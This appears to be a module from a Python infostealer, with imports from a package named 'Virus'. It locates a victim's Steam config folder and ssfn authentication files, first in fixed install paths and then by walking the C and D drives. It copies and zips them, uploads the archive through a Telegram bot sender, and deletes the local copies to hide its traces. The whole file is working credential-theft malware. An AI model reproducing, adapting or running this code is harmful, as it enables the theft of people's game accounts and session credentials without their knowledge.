import shutil
import os

from Virus.Helpers.Support import current_user
from Virus.Helpers.TG_bot_sender import Sender




steam_path = f'C:\\Users\\{current_user}\\AppData\\Local\\Steamm'

pathSsfn = (r'C:\Program Files\Steam', r'C:\Program Files (x86)\Steam', r'D:\Shop games\Steam')  # пути к папке со стимом
pathConfig = (r'C:\Program Files\Steam\config', r'C:\Program Files (x86)\Steam\config', r'D:\Shop games\Steam\config')  # пути к папке конфига стима

steam_config_path = rf'C:\Users\{current_user}\AppData\Local\Steamm\config'


class Steam:
    @staticmethod
    def main():
        ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default',
                          '$WinREAgent', 'Local', 'Common Files', '$Windows.~WS', 'Recovery', 'Roaming']
        for num in range(len(pathSsfn)):
            try:
                files2 = [i for i in os.listdir(pathSsfn[num]) if os.path.isfile(os.path.join(pathSsfn[num], i)) and 'ssfn' in i]
                shutil.copytree(pathConfig[num], steam_config_path)
                shutil.copy(pathSsfn[num] + '\\' + files2[0], steam_path)
                shutil.copy(pathSsfn[num] + '\\' + files2[1], steam_path)
            except:
                pass

        if len(os.listdir(steam_path)) > 1:  # если нет данных в папке завершит работу
            shutil.make_archive(steam_path, 'zip', steam_path)
            with open(steam_path + '.zip', 'rb') as steam:
                Sender.send_data(steam, 'Steam')
            os.remove(steam_path + '.zip')
            shutil.rmtree(steam_path)
        else:
            next_disk = True
            for disk in ['C', 'D']:
                if not next_disk:
                    break
                for root, dirs, files in os.walk(f"{disk}:\\"):
                    dirs[:] = [d for d in dirs if d not in ignore_folders]
                    if 'Steam' in dirs:  # если стим есть среди папок переопределяем dirs (для уменьшения длительности поиска)
                        dirs[:] = ['Steam']
                        continue
                    if 'Steam' in root:
                        try:
                            shutil.copytree(root + '\\config', steam_config_path)  # копирует папку с конфигом
                            files2 = [i for i in files if 'ssfn' in i]
                            shutil.copy(root + '\\' + files2[0], steam_path)
                            shutil.copy(root + '\\' + files2[1], steam_path)
                            next_disk = False
                            break
                        except:
                            print('ERROR')
            if len(os.listdir(steam_path)) < 1:  # если нет данных в папке завершит работу
                shutil.rmtree(steam_path)
                Sender.send_error("Steam")
            else:
                shutil.make_archive(steam_path, 'zip', steam_path)
                with open(steam_path + '.zip', 'rb') as steam:
                    Sender.send_data(steam, 'Steam')
                os.remove(steam_path + '.zip')
                shutil.rmtree(steam_path)

